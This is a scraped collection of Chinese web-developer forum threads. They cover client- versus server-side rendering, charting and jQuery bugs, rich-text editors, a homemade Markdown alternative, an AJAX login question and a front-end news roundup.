class=\"topic_content\">为什么有些前端觉得客户端渲染更「简单」？\r<br>因为你负责的是子系统啊！\r<br>子系统还能不简单啊。。。\r<br>文章里已经说了，客户端渲染框架每一步决策都是当下看起来正确的、简单的，只是合起来，就复杂了。</div>", "<div class=\"topic_content\">请收藏的人顶一下。。</div>"], "reply": "84", "tittle": "Web 开发不应该这么复杂", "comment": [" \r", "\"这样的模式渲染一个页面大概 300ms\"  \"也许再加点优化可以做到 1s 左右\"  \r", "1s == 1000ms > 300ms 不是更慢吗?", "写的很好, 楼主的表达能力 以及想要表达的内容我都觉得不错", " loading 我理解指的是 网速加载, 渲染我感觉是加载之后 webview 处理的时间? 期待楼主正解", " web 300ms ， iOS 1s ，不一样的平台", "前排观看 lz 又来挖大坑。", "1. 其实我观察到的历史不是因为后端渲染不够快，而是因为前端需求开始复杂到需要写 modular js 才出现的前端框架。\r", "2. 无法被搜索引擎检索，在 virtual dom 出现以前，前端框架普及之初已成问题。\r", "3. Turbolinks 的作者当然支持 webview ，而现实是市场更愿意选择性能优秀效果酷炫的 native app 。", "已经感觉到前端的复杂了，入职三个月，依然没有完全搞明白公司的整个前端框架，可能自己是前端新人的缘故吧。", "我觉得这篇文章很有意思，图文并茂说得很清楚。\r", "但是我看到“讲真，你们这些人知道康威定律吗？” 的时候，我心里一惊，因为我真的不知道这个是什么。托楼主的福又学到了新东西 :)\r", "接着往下看，发现文中的翻译好奇怪啊。我想“这里 produce 不该是动词么？” 于是我去查了维基百科，发现维基是这么说的“ organizations which design systems ... are constrained to produce designs which are copies of the communication structures of these organizations ”.\r", "好吧，学习了。", "看完全文了。\r", "我很喜欢文中那些结构图，很清楚。\r", "虽然是广告，但是我心里很赞同。如果用简单的工具能把事情搞定，就真的没必要搞复杂了。也许用各种高级工具各种抽象会更利于扩展，但现在的 web ，两三年工具就更新换代了，所以扩展说不定还不如重新写了。", "在手机平台上用 HTML 假冒一个本地应用的做法不是这两年才有的\r", "之前那些基本都死得很惨\r", "剩下一俩没死的都改成本地应用了", "赞！前后端细粒度分离，应该是产品 /部门大到一定程度的结果。\r", "楼主有没有考虑过产品 /用户规模大到什么程度时，才需要把前后端拆成这么细？ 1000w 用户？或更多？", "期待楼主很多的好文翻译。", "说几点：\r", "\r", "- 并不是所有的网站都有 SEO 需求；\r", "- SAAS 应用的前端一般比较复杂，如果还是按照 jquery 的组织方式来搞的话维护起来太麻烦了；\r", "- 我并不觉得 Google 提出的 angular ， Facebook 提出的 react 会让整个应用的结构变得复杂，相反的使用框架可以帮助我们写出更加低耦合，模块化，组件化的代码，同时数据与 DOM 的分离也让前端的单元测试更加方便。\r", "\r", "（之前是前端开发，现在做 rails 开发，一点感受）", "其实 Rails 支持了 API 模式，在某种程度已经表明 Rails 社区也同样认为前后端分离是合理的。", " 你们现在打广告都靠引战了吗 2333", "简单点，招人的方式再简单点", "同意 @", " 我觉得原视频的主要思想还是说包装 web view 到移动端一种新的方式。 如果服务器渲染出来的页面没有很复杂的交互逻辑，这的确够用了。有的话还是要写复杂的 JavaScript ，这时候前后端分离，工程化和组件化就很有必要了。前端框架 Angular 之类是将复杂的交互逻辑变得更容易实现，所以最终还是需求决定工具。", "一直不觉得前后端分离和规模大小有关。。。而且和性质有关。\r", "想想当年， you are not google ，所以你不配像 gmail 那样使用 ajax 。是不是呢？\r", "\r", "另外为什么要执着于 virtualdom 了，那只是实现的途径而已。说起来既然用了 rails 还大谈性能问题....各种 coc 不管是在后端还是在前端都是为了更'无脑化'的写代码吧", "唉，就是一句简单的具体问题具体分析", "套路精髓 Max ，传统 jQuery 党就默默看着", "rails 开发够简单", "这些框图都太复杂了。搞什么 MVC ，搞什么 EJB ？\r", "\r", "想想 20 年前，是这样的：\r", "\r", "httpd --> xxx.cgi\r", "\r", "够简单了吧？不依赖 MVC ，我们还能优雅的写代码吗？", " 话虽如此，但是这个万金油回答说了等于没说哦，抛观点，引讨论还是好事", " 当时是时机不对。而且 Turbolonks 也有相应的优化", " 单单前端那块不复杂，不就是个类 MVC 结构，但是前后加一起就复杂了。", "写的挺好,大公司之所以采用复杂的结构,还是因为\r", "1 分工足够细致\r", "2 极致需求\r", "3 足够长的架构演进过程\r", "要是小公司或者小产品一开始就弄得很复杂,那肯定是个灾难.", "所以全栈应该用 rails", " 大公司是因为分工细才使用这种框架，因果正好是反的，先分工，再找框架。", " Turbolinks 已经不只支持 Rails 了。用其它后端框架也可以。", "Turbolinks 还是要赞的\r", "但是在非 rails 的圈子里，似乎还不太知名", "招聘需求呢..", "业务决定技术方向： D 。\r", "不过前端近几年突发的概念是多了，虽然到了最后还是 DOM DOM DOM", "简而言之就是一句话：做个小网站架构不要太复杂。\r", "\r", "TM 简直废话。\r", "\r", "另一句话，做大系统必须要复杂但清晰、耦合度低的架构，就被标题“ Web 开发不应该这么复杂”吃掉了。\r", "\r", "拜托 Web 开发不仅仅是做个 2 ， 3 个人日工作量的小网站好不好！", "彩程强行广告啊。 tower 的移动段体验非常差。", "哇， tower 的工程师，远程开发好向往。", "楼主从阿里跳到 Tower 去了？", "学习阶段，个人建站，前端领域问题可以一起交流讨论！ ", " 本文说的是大网站， 200 个设计图，历时 18 个月，部署都五个平台。", "原来是彩程大大，膜拜。早在几年前 Simditor 还没有图片上传的接口文档的时候，我还研究源码写了 Rails 的封装 gem ，结果下个版本就出了完整的接口和文档。\r", "\r", "另外说观点，和上篇一样，完全赞同。", " 那不是我写的，是带我的人写的。", "我赞成， mvc 取得了很好的平衡", " 你说的优点都对，但是缺点我受不了。利大于弊还是弊大于利，就看团队结构和产品结构了。一般情况，我倾向于不要使用客户端渲染。特殊情况可以用。", "不怕，想前后端分离的来做 Tower ，我现在移动版是 Vue + Rails API", "前端渲染你们团队不用就不用，还让全世界都不用？没摸清门道怪“复杂度暴涨”，那生产机器上的操作系统，你们全部掌握了？\r", "看到楼主就知道他要说什么了。简直就像传教士。", " 我 append 了~", " React 能传教， Vue 能传教，我就不能传教？ 呵呵", " 哈哈哈， Tower 之前的移动版我就用的是 Turbolinks ，主站是自己写的一套 pjax 框架。", " 有本事写文章说你自己的观点，而不是像这样避开观点谈我本人是不是传教士。", " 给你了模块化，组件化，爽的飞起的 ES6 ， webpack 的各种好用的 loader 并且是傻瓜式配置，方便的前端测试，文件动静分离方便 CDN 加速，这些好用的东西还不够吗，那请问你说的缺点是什么缺点呢？\r", "\r", "Tower 我也关注过，你们的产品很赞。", " 没有 SEO 支持，首页渲染很慢。\r", "而且动静分离、模块化、组件化、 ES6 、前端测试都可以单独做，并不是前端框架带来的特性。", " 为什么前端在使用了前端框架后才开始模块化、组件化、 ES6 ？可以参考我之前对前后分离动机的腹黑推测：因为前端开发者对这些东西没有控制力和话语权。你让后端打包的时候加个 babel ，后端才不愿意承担风险呢！", " 前端只好说，好吧，你们后端不帮忙，我就全用 JS 做。\r", "就是这样，起码我见到的一些大团队是这样的。", " 你当然可以自己做啊，自己写一套东西给团队使用，我也这么干过，但是这不还是一个框架吗？我主要说的点不是前端框架，而是前后端分离的开发思路(不是人员分工，而是技术上的分离)。", " 现在似乎很少见 React 跟 Vue 传教的。\r", "我的观点？具体问题具体分析。两种方案都有利弊，看需求咯。目前看来抛弃哪一种都是不可取的。", "前端奇技淫巧太多,我是覺得所有後端都應該朝全棧發展", "认真看完了，很好的反思。康维定律很深刻，我觉得可以用到很多管理领域。感谢楼主。", "真正想做前端的同学来我们公司吧，数据可视化驱动，抽象高智商业务超复杂交互，真正前后端分离！\r", "后端渲染的同学就不要想了。。。还是去那些就简单做做 CRUD 的“用世界上最好语言和框架”的公司吧 = =\r", "\r", "职位描述：\r", "\r", "1 、负责前端效果的实现，将设计师提供的设计图转换成静态页面，并实现各类页面动态效果；\r", "\r", "2 、与设计师、开发人员配合，根据需求调整、修改、优化页面；\r", "\r", "3 、解决网站页面浏览器的兼容问题；\r", "\r", "4 、其他上级分派的工作。\r", "\r", "\r", "岗位要求：\r", "\r", "1 、 2 年以上相关经验，计算机科学与技术相关专业专科以上学历；\r", "\r", "2 、熟悉 JQuery 、 Bootstrap 或类似开发框架；\r", "\r", "3 、精通 HTML5+CSS3 ，熟悉 DIV+CSS 页面布局，能手写样式代码；\r", "\r", "4 、能使用 JavaScript 开发产品及制作交互原型优先；\r", "\r", "5 、熟悉 AngularJS 、 ElasticSearch 优先；\r", "\r", "6 、了解 Linux 系统；\r", "\r", "7 、有团队合作意识。", "对对对，你说的很对。某一天产品经理说我们要写原生 Android 客户端和 iOS 客户端…", " 连个熟悉 D3 都不要求讲啥数据可视化啊", " 请问流程图是用什么工具画的？", " D3 可以过来学习，没关系，只要对浏览器 前端技术比较熟悉，学习起来还是很快的。有些可视化我们都是自己写的不一定非要依赖 D3 ， D3 依赖 SVG 渲染，在大规模数据场景下会有性能瓶颈。", " 我做的某天文工控系统就差不多是这样的， web 界面的 php 就是个幌子，直接 passthru 调 C （你没看错就是 ANSI C ）写的实际控制程序。\r", "只有两段 JS ，一个用来显示动态曲线图，一个用来显示图片缩放。\r", "因为这个系统要求的基本上是实时响应，去你娘的 web 渲染，哪有那闲情逸致。\r", "不过说实话这样写的代码真的非常简洁清晰，很容易看懂，维护起来很方便，加个新功能也就半个小时（算上测试）的事情完事儿了。", " 跟大小无关，关键看需求\r", "IBM 以前的 CM 就是很低耦合的系统，也算是很复杂的东西了，但是 web 前端基本等于没有\r", "然后一些客户就抱怨说你们的 web 太烂了，能不能给我们一个好看的界面\r", "然后 IBM 收购了 FileNet ，用 FileNet 那套花哨的前端架在自己的后端 CM 上\r", "结果是花了很多很多钱，人力物力。然后那帮客户后来又发现，在这个前端上他们要做二次开发可就迷糊了，又想退回去了\r", "其实很多时候那些用户们并不知道他们究竟想要什么东西，这就是为什么 Jobs 能成功的秘诀", " 他手画的", "看了下视频，其实就是在宣传 turbolink 的炫酷叼炸天", " 这是产品要背锅的。如果有大量二次开发的需求，那么在第一时间就要考虑到二次开发怎么做，甚至把自己团队降低到第三方一样的高度来先搞好二次开发框架（其实也没有二次开发框架了，就是一样的开发）。\r", "但这难度太大了，以 KPI 论的大商务软件公司真的很难搞（比如我司）。", " 什么叫数据可视化驱动。。 2333", " 产品背锅？收购 FileNet 这么大的事情产品哪背得起这锅！大公司有些行为并不完全是简单的跟软件开发那套逻辑相关，还有很多七七八八匪夷所思的逻辑。所以小公司跟着学样会死得很惨。\r", "比如，刚收购 FileNet 的时候，我发现他们的人工作态度比 IBM 的自己人好太多，然后唠叨给美国的架构师，结果那厮说， This is just what we wanted to pay for.", " 就是产品设计，技术选型，还有架构设计都是围绕数据可视化来做的，以把有价值的数据以最直观的方式展现给用户为目标驱动研发。语言是写的太精简了，主要怕影响大家灌水。本以为做过成熟商业软件开发的 v 友们都能 get 到 point ，实在不能理解的估计是经验还有看问题的思维比较不一样，不过可以一起探讨。跟檀木网站上比可能用语方式是不太一样可 v 站是专业技术社区，想必说的缩略点大多数专业极客 v 友们还是可以理解的，如果实在理解不能可以到漫展上约我当面切磋-  -！", " 我说产品背锅不是说背收购前端技术公司这种锅，而是对自己产品定义上的锅。不管收购了什么前端技术公司，只要能清晰定义出以扩展性为第一优先，所有技术都围绕如何方便和安全地扩展来开发，也能达到满足第三方扩展的需求。\r", "\r", "只是这对于大公司来说太难了。\r", "\r", "比如我司，也和 IBM 差不多，部门结构庞杂，部门做事主要要 show 给老板看，老板做事主要要 show 给更大的老板看，结果最容易受重视的就是看起来好看的东西（不仅仅是指视觉上），至于扩展性啦什么的，总以为以后慢慢加……但架构都定死了加什么加……\r", "\r", "这么说来也不是产品这个职务的锅，主要还是回到产品原始定义上去，本来就定义成好看但不易扩展的产品，那自然就很难做出方便二次开发的产品。然而不幸的是，一般原始定义产品的时候，大佬们都只想着花三分钱办五分事，尽快把东西弄出来（毕竟人家的 KPI 是这个），而不是为以后真的推向市场的时候的扩展性来花十分功夫打基础。", " 这没必要吧", "很好，第一次听说康威定律，值得深思", "哎，天天扯这些没用的。", "tower / 知人 用户路过帮顶\r", "选择适合自己的即可，没必要争论\r", "over", "Tower 用的是 Vue + API 模式吗？\r", "为啥打开控制台没看到 vue ，是我打开的姿势不对吗？", " \r", "\r", "rails + vue, web 端我是这样弄，但是移动端这样弄，是指原生+webview ？求解惑", "虽然我是前端（写 exe 的前端 XD ），其实我也觉得前端炒作过热了， 感觉市场真正需求的还是全栈。\r", "但是全栈技术栈比较杂，很难互相匹配。", "  @", "   这样比较难招人吧  你让一个写后端的去做前端的事情，做出来的用户体验一般比较差的(前端不只是完成逻辑，更要重视用户体验)，或者开发周期长，同样你让一个前端熟手去写后端，也会遇到各种性能问题，尤其是数据量大的情况下，这些都是我真实遇到过的。这个问题怎么解决呢？毕竟称得上 web 全栈的还是太少了。", " 你们的编辑器还维护吗，发邮件没人理，提 PR 也没人理……", " simditor 吗？  不是有人理吗", " ", " 最后提交已经很久了啊 一个月前 master 分支。", "这里是从后端到前端的破厂码农，该文说的一些问题当然是存在的。\r", "看了您的几篇文章，觉得您说的很有道理，只是语气冲了点，而且标题似乎应该改成“我不是针对谁，盲目套用大厂架构的都是辣鸡” 23333333333333", "但是如果把前端做得简单 导航、控制器这些逻辑都会移动到后端 逻辑是一样复杂 只是架构变简单了", "看完了回复，楼主是想说“框架过于复杂”还是什么呢？事实上前端工程依赖的复杂度，主要不是由框架引入的，主要还是一堆 shim 、 babel 之类的，这可都是浏览器的锅啊。“无 JS 也能使用”的应用，体验肯定是个问题，这种由市场决定的选择，也是无可奈何的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>弄了几天都没成功，希望有这方面经验的大神帮帮忙，事成后发个红包感激下。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>补上<a href=\"http://jsfiddle.net/chimingphang/mwcws3dc/2/\" rel=\"nofollow\">demo</a> ,希望点击按钮可以让每条间隔3分钟，5分钟，15分钟。tickInterval用了也不行。不过手机放大就可以看到时间间隔变。知道的大侠帮帮忙。我的邮箱chimingphang@gmail.com</p>\n</div></div>"], "reply": "7", "tittle": "Highstock X 轴刻度问题求助，发红包跪求。", "comment": ["你先把问题说清楚，最好能搞个在线可运行的 demo ，大家就都很乐意免费给你搞了；\r", "\r", "你这样子问题不太清楚，谁也不敢接，接了搞不定就尴尬了。", " 谢谢提醒。我补上 demo 了", "\"If the tickInterval is too dense for labels to be drawn, Highcharts may remove ticks.\"\r", "\r", "你这都跨几天的数据了，然后还要 tick 间隔 5 分钟，一个像素都画不过来……", " 请问我要调什么参数？", " \r", "\r", "我看了你的数据，是每 5 分钟一条的；\r", "\r", "没搞过这个，不过可以给点思路，就是根据时间单独取数据绘制(3 分钟为间隔的， 5 分钟为间隔的)；\r", "\r", "\r", "参照下 okcoin 的设计， ", " ，每个时间间隔，都是单独取数据，重新绘图；\r", "比如 15 分钟图，那么就从后台获取 15 分钟间隔的数据(1000 条)，然后 窗口 用 100 个宽度，这样子向左拖动，可以拖动 10 屏，基本上够用了；\r", "\r", "\r", "如果按照你现在的搞，\r", "像你说的那个样子， 3 ， 5 ， 15 ，那么后台应该传过来最小公约数 1 分钟的，然后你自己计算 group ；重新绘制；不过这个样子， 15 分钟时候，显然需要数据量太大，不划算；", " 好的，感谢提示，我再试试"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>\"</p><div><p></p>\n<div>&lt;button class=\"btn btn-danger btn-del\"&gt;删除&lt;/button&gt;</div>\n<div>weiwei</div></div>\"\n                                 $(this).click(function(e){\n<pre><code>                                $.ajax({\n                                    url: \"/wa/mg/mysitedel\",\n                                    data: {\n                                        csrfmiddlewaretoken: '{{ csrf_token }}',\n                                        siteid: siteid\n                                    },\n                                    type: \"post\",\n                                    cache: !1,\n                                    dataType: \"json\",\n                                    success: function(e) {\n                                        if (e.retCode == 1) {\n                                            alert(siteid);\n                                            $(\"#siteid\").remove();\n                                        }\n                                    },\n                                    error: function() {\n                                        alert(\"删除失败，请稍候重试\");\n                                    }\n                                })\n                            });\n</code></pre>\n<p>alert(siteid);这一行的输出是 27。\n第一次发，div标签发不出来啊晕</p>\n</div></div>"], "reply": "10", "tittle": "删除按钮，删除成功后调用 remove()删除父层失败？", "comment": ["$(\"#siteid\").remove();\r", "这句的意思是找 id 为  siteid 的元素，然后移除它。\r", "\r", "我想你要的不是这个吧， 试试\r", "$(\"#\" + siteid).remove();", " 嗯谢谢！我自己也找到问题了，就是这么干的。但是这个 bbs 发不出 div 标签吗真拙计", " 截图成图片发出来嘛", " 没找到发图片按钮。。。晕", " ", " 3Q3Q", "为啥要写两个 e 呢 ?", " 回调函数里用的数据", " event error  response data 是不是区分开比较合适一点？我是大眼一看有点晕 ，再看一眼才明白..", " 哈哈前端留下的页面是这么写的，我就直接粘过来了， sorry"]},
{"content": ["<div class=\"topic_content\">discuz 里面有一个编辑器，当从页面上复制内容，好像连样式也会复制过去。这样就会卡死，能优化吗？</div>"], "reply": "7", "tittle": "老司机们，做过富文本编辑器的进来一下", "comment": ["所谓“好像连样式也会复制过去”，实际上就是 HTML 代码复制过去了。\r", "\r", "富文本编辑器就是 HTML “所见即所得”编辑器——浏览器自带，功能简单。\r", "\r", "解决办法：删除垃圾 HTML 代码。", "说明你内容太多了，浏览器处理不过来，分批次复制吧。\r", "或者尝试先赋值到源代码里看看。", " 这年头浏览器很牛逼的，静态内容再多，也难卡死呀。我觉得多半是有垃圾代码。", "这种编辑器都是 js 写的，写不好弄出死循环之类的就会卡死浏览器。如果复制很少的内容也会卡死，多半是编辑器的 bug 。", "貌似有一些编辑器有 cleanFormat 之类的处理。", "没有粘贴成纯文本格式的选项吗？", "用 ueditor 吧，这个现在做的还不错。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/dou4cc/drool\" rel=\"nofollow\">https://github.com/dou4cc/drool</a>\n<br>\n欢迎发 issue 。</p>\n</div></div>", "<div class=\"topic_content\">想把 drool 用在自己网站上的找我，我阉一部分功能，做成兼容版给你。</div>"], "reply": "34", "tittle": "markdown 用得不顺手，自己 diy 了个替代品", "comment": ["markdown 都用的不顺手了啊。", "openvpn 被墙了怎么办。有解没有。\r", "\r", "日志提示： openvpn tcp recv error:connection reser by peer\r", "\r", "\r", "VPN 板块没人看。。。", " 无解。", "唉，所以啊，谁也别吐槽谁，你们这群程序员不也是闲的蛋疼，重复造这么多轮子", "你们这群程序员啊，别闲着没事老造轮子，没事多多扯扯淡", "然而你的 README", "做个 demo 不能先编译一下吗。。", " @", " Babel 的编译不严谨，我恰好用到了它不支持的特性。", " 看到一个恶心的工具就写一个更恶心的来恶心原作。这就是开源之滥。\r", "\r", "外， URL 的括号严格我觉得是一个良好的设计，格式不严谨，弄得各种 versatile ，真是很 sb ……\r", "\r", "外，看到你的源码： ", " 我就醉了。\r", "\r", "外，“中文标点不会使用英文字体”这就叫对中文友好？，这明明就是设置一下 CSS 的设置，跟你的 drool 有什么关系。（在你的 CSS 里我啥都没看到）", " “中文标点不会使用英文字体”是需要 JS 辅助的", " 关键代码是那个 drool.js", " 直接看.drool 文件最好把 tab-size 调大，比如 80ch", " 直接看.drool 文件最好把 tab-size 调大，比如 25ch ……（刚刚手滑）", "关注者寥寥啊", " 80 ch （字符）？……哈哈。我的屏幕宽度要跪。我觉得你高估了用户的折腾愿意度。很多人是不可能专门为了看你的 demo ，去装个一个浏览器；去下载你的 .drool 文件然后调编辑器的 tab 宽度。\r", "\r", "（除了 Makefile 和自己的程序输出反正我是从不用 tab 的。）", " 是 25ch\r", "作为一个 JS 爱好者，我电脑上各种 nightly 级别的浏览器，外加启用了所有 flag", "简单提个建议吧，主页的 README 还是整理一下格式吧，这个 README 怎么也看不出是一个会用 Markdown 的人写出来的。然后就只能关掉走人了。", " 你看一下吧", " 如果要用一个列表，那么需要让别人清楚这个列表是在说什么事情。比如：\r", "\r", "drool 解决了如下问题：\r", "- aaa\r", "- bbb\r", "\r", "如果我对这个主题没兴趣，就直接跳过这一段。\r", "\r", "排版是让文字更容易被别人理解，如果不能达到这个目的，那么排版就没有什么意义了。", "一个例子：\r", "\r", "## drool\r", "\r", "drool 简介\r", "\r", "### Markdown 存在的问题\r", "\r", "1. aaa\r", "2. bbb\r", "\r", "### droop 的优势\r", "\r", "1. aaa\r", "2. bbb\r", "\r", "### 效果演示\r", "\r", "### 使用方法\r", "\r", "### License\r", "\r", "MIT\r", "\r", "\r", "首先要把提纲列好，需要写几项内容，它们之间的递进关系。然后把具体的内容按合理的形式组织好。然后再考虑怎么断句能让内容呈现得更美观。最后考虑加亮某些关键内容等细节。这些不是只看 Markdown 的语法就可以掌握的。可以多看下一些软件主页的介绍、文章等。当你掌握了这些，才会真正发现 Markdown 的痛点，然后才可能提出切实可行的解决办法，需要循序渐进。", "你的 demo 挂了吧？", "我用的是 Chrome Canary ， demo 打不开", "洗洗睡吧", "你没试过 org mode?", "你的 README 让我头痛，非常像我刚开始写文档时的样子，各级之间毫无逻辑联系，看上去非常混乱， 19 与 20 楼已经讲的很清楚了，多级标题的使用应该规范，等真的了解之后你会发现 markdown 的便捷之处", "既然 markdown 自称源码的可读性堪比可视化编辑，为什么我们还要把*something*编译成 something ？于是，我设计了 drool 。它没有加粗、斜体之类的功能（*something*的可读性就很好了，不是吗？），但可用缩进（ drool 的缩进可用作表格）和右对齐表达文档结构，图片（音视频）、链接仍可插入。\r", "\r", "= = 根本读不通，，，木有加粗斜之类的功能？.....这个功能不重要？", "为什么 markdown 都用不顺手呢？？好奇怪", " 还要开两个 flag ，具体见 readme", " 内容不超过两千字我都不排版，毕竟只有扁平的逻辑才好排版，而且排版很烦……\r", " drool 有表示文档的层级关系的相关特性", " 我的意思是要强调某个内容，不必斜体，直接在两旁加“*”又不会乱", " 仅当使用 drool 绘制表格时才需设置 tab-size 来使.drool 文件更有可读性", "不排版我只能说你开心就好咯。。。", "要理解 markup 的本质，当一个 markup 变得复杂的时候，那就它和 html 有何区别。\r", "然而，你们这群程序员在用 markdown ，我却在用 creole wiki( ", ")", " 我做的 drool 比 creole wiki 简洁"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在有两个系统，要实现共用用户密码框分别登录不同系统，现在已经实现了信息系统的登录，那个办公系统的如何通过 ajax 来实现？或者有更好的方法？</p>\n<p>帮看看是哪里写错了？才刚刚开始学 ajax ，代码是下面那段</p>\n<p>这是登录 OA 系统的，现在想改为 ajax 登录</p>\n<pre><code>&lt;html&gt;               \n&lt;body&gt;        \n  &lt;p&gt;请登录&lt;/p&gt;        \n  &lt;form id=\"login\" name=\"login\" method=\"POST\"  action=\"http://192.168.1.101/logincheck.php\" &gt;        \n    &lt;p&gt;用户名:&lt;input id=\"username\" type=\"text\" name=\"USERNAME\"  /&gt;&lt;/p&gt;        \n    &lt;p&gt;密&amp;nbsp;码:&lt;input id=\"password\" type=\"password\" name=\"PASSWORD\" /&gt;&lt;/p&gt;          \n    &lt;input type=\"submit\" name=\"Submit\" value=\"进入办公系统\" /&gt;\n  &lt;/form&gt;        \n &lt;/body&gt;        \n&lt;/html&gt;    \n</code></pre>\n<p>这个是两者结合的，已实现信息系统的登录。</p>\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n\t&lt;script type=\"text/javascript\" src=\"http://192.168.1.100/ReportServer?op=emb&amp;resource=finereport.js\"&gt;&lt;/script&gt;\n\t&lt;script type=\"text/javascript\" src=\"doFanruan.js\"&gt;&lt;/script&gt;\n\t&lt;script type=\"text/javascript\"&gt;\n\tvar usr = $('#username').val();\n\tvar pwd = $('#password').val();\n\t$('#Button1').click(function()){\n\t\t$.ajax({\n\t\t\ttype:\"POST\",\n\t\t\tdata:{\"USERNAME\":usr,\"PASSWORD\":pwd},\n\t\t\turl:\"http://192.168.1.101/logincheck.php\",\n\t\t\twindow.open(data.url),\n\t\t})\n\t}\n\t&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\t&lt;form id=\"login\" name=\"login\" method=\"POST\" action=\"\" &gt;\n\t&lt;p&gt;用户名:&lt;input id=\"username\" type=\"text\" name=\"USERNAME\"/&gt;&lt;/p&gt;\n\t&lt;p&gt;密&amp;nbsp;码:&lt;input id=\"password\" type=\"password\" name=\"PASSWORD\" /&gt;&lt;/p&gt;\n\t&lt;input type=\"button\" value=\"进入信息系统\" onClick=\"doSubmit()\"/&gt;&amp;nbsp;&amp;nbsp;&lt;input type=\"button\" id=\"Button1\" name=\"Submit\" value=\"进入办公系统\"/&gt;\n\t&lt;/form&gt;\n\t&lt;/body&gt;\n\t&lt;/html&gt;\n</code></pre>\n<p>因为通达 OA 的 php 是加密的，所以在网上搜到只能通过 post 用户密码到 logincheck.php 来进行自定义登录。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "小白问下如何通过 ajax 实现通达 OA 登录？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>微软公布 TypeScript 2.0 RC 版本</h2>\n<p>在 8 月 30 日，微软公布了 TypeScript 2.0 RC 版本，增加了一些特性，已经离正式版不远了，目测功能应该不会再有太大的变化。</p>\n<p>原文地址：<a href=\"https://blogs.msdn.microsoft.com/typescript/2016/08/30/announcing-typescript-2-0-rc/\" rel=\"nofollow\">https://blogs.msdn.microsoft.com/typescript/2016/08/30/announcing-typescript-2-0-rc/</a></p>\n<h2>Angular 2.0 RC6 发布</h2>\n<p>总感觉 Angular 2.0 在跟谁 TypeScript 2.0 的脚步，在 8 月的最后一天，也就是 TypeScript 2.0 RC 发布后的第二天， Angular 2.0 发布了第 6 个 RC 版本。增强了静态编译、表单功能和国际化。 Angular 2.0 难道要等 TypeScript 2.0 出正式版才肯 Release 吗？</p>\n<p>原文地址：<a href=\"http://angularjs.blogspot.com/2016/09/angular-2-rc6_1.html\" rel=\"nofollow\">http://angularjs.blogspot.com/2016/09/angular-2-rc6_1.html</a></p>\n<h2>Google Closure Compiler 发布纯 JavaScript 版本</h2>\n<p>老同学们可曾记得 Google 的 Closure Compiler ，当时是继 YUI Compressor 之后的另一个 JavaScript 压缩工具，不过跟 YUI Compressor 一样，都是需要 Java 环境的。后来在 Node.js 时代，终于被 UglifyJS 所替代，现在， Google 的 Closure Compiler 出了纯 JavaScript 的版本，可以直接在 Node.js 环境使用，据说这并不是一个重写的版本，而是把 Java 代码转成了 JavaScript 代码，至于怎么做到的， Google 并没有告诉我们……</p>\n<p>原文链接：<a href=\"https://developers.googleblog.com/2016/08/closure-compiler-in-javascript.html\" rel=\"nofollow\">https://developers.googleblog.com/2016/08/closure-compiler-in-javascript.html</a></p>\n<h2>Babel 6.14.0 发布</h2>\n<p>上周早些时候 Babel 发布了 6.14.0 版本，增加了<code>es2017</code>的 preset 。</p>\n<p>原文地址：<a href=\"https://babeljs.io/blog/2016/08/24/6.14.0\" rel=\"nofollow\">https://babeljs.io/blog/2016/08/24/6.14.0</a></p>\n<h2>babili</h2>\n<p>Babel 出的一个代码压缩工具，但只转化到 ES6 ，需要浏览器原生支持 ES6+。</p>\n<p>项目地址：<a href=\"https://github.com/babel/babili\" rel=\"nofollow\">https://github.com/babel/babili</a></p>\n<h2>xterm.js</h2>\n<p>一个浏览器里的 xterm 组件，完全支持 xterm ，在你的页面里加入命令行。</p>\n<p>项目地址：<a href=\"https://github.com/sourcelair/xterm.js\" rel=\"nofollow\">https://github.com/sourcelair/xterm.js</a></p>\n<h2>Cesium</h2>\n<p>一个基于 JavaScript 和 WebGL 技术的虚拟地球。</p>\n<p><a href=\"http://cesiumjs.org/\" rel=\"nofollow\" title=\"http://cesiumjs.org\">http://cesiumjs.org</a></p>\n<h2>react-dates</h2>\n<p>由 Airbnb 开发的一个 React 日期选择组件，轻松选择开始时间和结束时间。</p>\n<p><img alt=\"clipboard.png\" src=\"http://segmentfault.com/img/bVCJCR\"></p>\n<p>项目地址：<a href=\"https://github.com/airbnb/react-dates\" rel=\"nofollow\">https://github.com/airbnb/react-dates</a></p>\n<h2>dext</h2>\n<p>类似 Alfred 或 macOS 自身 Spotlight 的一个东西，又是使用 Atom 的 Electron 编写。</p>\n<p>项目地址：<a href=\"https://github.com/vutran/dext\" rel=\"nofollow\">https://github.com/vutran/dext</a></p>\n<h2>WebMonkeys</h2>\n<p>使用 GPU 进行运算，大量的数据运算可以扔给 GPU 去处理。</p>\n<p>项目地址：<a href=\"https://github.com/MaiaVictor/WebMonkeys\" rel=\"nofollow\">https://github.com/MaiaVictor/WebMonkeys</a></p>\n<h2>KeystoneJS 4.0.0 Beta</h2>\n<p>KeystoneJS 发布 4.0.0 Beta 版本，一个基于 Node.js 的 CMS 。</p>\n<p>官网：<a href=\"http://keystonejs.com/\" rel=\"nofollow\">http://keystonejs.com/</a></p>\n<h2>Push.js</h2>\n<p>让你轻易的弹出浏览器通知，号称支持所有浏览器（ IE 除外）。</p>\n<p>官网：<a href=\"http://nickersoft.github.io/push.js\" rel=\"nofollow\">http://nickersoft.github.io/push.js</a></p>\n<h2>Grade.js</h2>\n<p>根据图片的生成对应的渐变色，可以参考一下 demo ，是否真的有用。</p>\n<p>官网：<a href=\"http://benhowdle.im/grade/\" rel=\"nofollow\">http://benhowdle.im/grade/</a></p>\n<p><strong>最近好多从各种语言转 JavaScript 的编译器，这两周又冒出来三个……</strong></p>\n<h2>BuckleScript 1.0</h2>\n<p>金融界的彭博也来凑热闹，发布了 BuckleScript 1.0 版本，一个 OCaml 转 JavaScript 的编译器。</p>\n<p>原文地址：<a href=\"http://bloomberg.github.io/bucklescript/blog/index.html\" rel=\"nofollow\">http://bloomberg.github.io/bucklescript/blog/index.html</a></p>\n<h2>GopherJS 1.7-1</h2>\n<p>GopherJS 发布 1.7-1 版本，可以把 Go 1.7 的代码转成 JavaScript 。</p>\n<p>原文地址：<a 